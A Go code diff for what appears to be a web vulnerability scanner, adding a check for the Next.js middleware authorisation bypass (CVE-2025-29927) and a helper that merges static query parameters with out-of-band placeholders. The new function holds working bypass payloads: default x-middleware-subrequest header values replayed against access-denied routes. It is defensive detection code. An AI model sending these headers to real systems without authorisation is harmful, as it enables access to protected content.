@@ -374,6 +374,13 @@ func executeSingle(ctx context.Context, spec *plugin.PluginSpec, file *Tier1File
 			return nil, fmt.Errorf("tier1 execute: bad target %q: %w", target, err)
 		}
 	}
+	if len(file.Request.Query) > 0 {
+		var err error
+		rawURL, err = withStaticQuery(rawURL, file.Request.Query, oobCorr, oobDomain, oobCBURL)
+		if err != nil {
+			return nil, fmt.Errorf("tier1 execute: bad static query for %q: %w", target, err)
+		}
+	}
 	reqHeaders := file.Request.Headers
 	oobHeaderName, oobHeaderValue := "", ""
 	if oobCorr != "" && len(reqHeaders) > 0 {
@@ -734,6 +741,8 @@ func executeSingle(ctx context.Context, spec *plugin.PluginSpec, file *Tier1File
 		}, Evidence: ev}}, nil
 	case "verb-tamper", "verbtamper", "verb_tamper":
 		return executeVerbTamper(ctx, spec, file, target, method, rawURL, status, headers, body, send)
+	case "middleware-bypass", "middleware_bypass", "middlewarebypass":
+		return executeMiddlewareBypass(ctx, spec, file, target, method, rawURL, status, headers, body, oracleParams, send)
 	case "oob":
 		// No provider or no minted token: the payload went out verbatim and
 		// no callback can ever match it. The oracle would answer skipped;
@@ -919,6 +928,82 @@ func executeVerbTamper(ctx context.Context, spec *plugin.PluginSpec, file *Tier1
 	return out, nil
 }
 
+// executeMiddlewareBypass compares an access-denied control request with
+// variants carrying Next.js middleware bypass headers (CVE-2025-29927).
+// What: The initial declarative GET is the control; each configured header
+// value is replayed on the same path and judged by MiddlewareBypassOracle.
+// Why: A route is only a finding when the control proves an auth boundary and
+// the variant returns materially different 2xx protected content.
+func executeMiddlewareBypass(ctx context.Context, spec *plugin.PluginSpec, file *Tier1File, target, method, rawURL string, ctrlStatus int, ctrlHeaders http.Header, ctrlBody string, oracleParams map[string]any, send Sender) ([]Tier1Result, error) {
+	header := strings.ToLower(getStringParam(oracleParams, "header", "x-middleware-subrequest"))
+	values := getStringSliceParam(oracleParams, "header_values")
+	if len(values) == 0 {
+		values = []string{
+			"middleware",
+			"middleware:middleware:middleware:middleware:middleware",
+			"pages/_middleware",
+			"src/middleware",
+		}
+	}
+	reqHeaders := file.Request.Headers
+	if ctrlStatus == 0 {
+		var cErr error
+		ctrlStatus, ctrlHeaders, ctrlBody, cErr = send(ctx, method, rawURL, reqHeaders, nil)
+		if cErr != nil {
+			return nil, fmt.Errorf("tier1 middleware control %s: %w", rawURL, cErr)
+		}
+	}
+	ctrlLocation := ""
+	if ctrlHeaders != nil {
+		ctrlLocation = ctrlHeaders.Get("Location")
+	}
+	if !oracle.MiddlewareControlDenied(ctrlStatus, ctrlLocation) {
+		return nil, nil
+	}
+	path := rawURL
+	if u, err := url.Parse(rawURL); err == nil && u.Path != "" {
+		path = u.Path
+	}
+	var out []Tier1Result
+	for _, value := range values {
+		vHeaders := make(map[string]string, len(reqHeaders)+1)
+		for k, v := range reqHeaders {
+			vHeaders[k] = v
+		}
+		vHeaders[header] = value
+		vStatus, vRespHeaders, vBody, vErr := send(ctx, method, rawURL, vHeaders, nil)
+		if vErr != nil {
+			continue
+		}
+		cls := baseline.ClassifyStatic(vStatus, vRespHeaders, []byte(vBody))
+		ev, err := (oracle.MiddlewareBypassOracle{}).Verify(ctx, cls, false, oracle.MiddlewareBypassParams{
+			ControlStatus:   ctrlStatus,
+			ControlLocation: ctrlLocation,
+			ControlBody:     ctrlBody,
+			BypassStatus:    vStatus,
+			BypassBody:      vBody,
+			Header:          header,
+			HeaderValue:     value,
+			Path:            path,
+		})
+		if err != nil {
+			return nil, err
+		}
+		if ev.Verdict != oracle.VerdictAccept {
+			continue
+		}
+		out = append(out, Tier1Result{Candidate: plugin.Candidate{
+			PluginID:       spec.ID,
+			Target:         target,
+			InjectionPoint: plugin.InjectionPoint{URL: rawURL, Method: method, ParamName: header, ParamLocation: "header", Value: value},
+			OracleName:     "middleware-bypass",
+			OracleParams:   map[string]string{"header": header, "control_status": fmt.Sprintf("%d", ctrlStatus), "bypass_status": fmt.Sprintf("%d", vStatus)},
+		}, Evidence: ev})
+		break // one confirmed header variant per path is enough
+	}
+	return out, nil
+}
+
 func getStringParam(params map[string]any, key, defaultVal string) string {
 	if v, ok := params[key]; ok {
 		if s, ok := v.(string); ok {
@@ -985,6 +1070,26 @@ func withQueryParam(target, param, value string) (string, error) {
 	}
 	q := u.Query()
 	q.Set(param, value)
+	u.RawQuery = q.Encode()
+	return u.String(), nil
+}
+
+// withStaticQuery applies declared static query values to a request URL.
+// What: Deterministic query map merge with OOB placeholder expansion.
+// Why: Some product endpoints require companion parameters (Next.js image
+// optimizer needs w/q) that are not injection targets themselves.
+func withStaticQuery(rawURL string, static map[string]string, corr, domain, cbURL string) (string, error) {
+	if len(static) == 0 {
+		return rawURL, nil
+	}
+	u, err := url.Parse(rawURL)
+	if err != nil {
+		return "", err
+	}
+	q := u.Query()
+	for k, v := range static {
+		q.Set(k, expandOOBPayload(v, corr, domain, cbURL))
+	}
 	u.RawQuery = q.Encode()
 	return u.String(), nil
 }
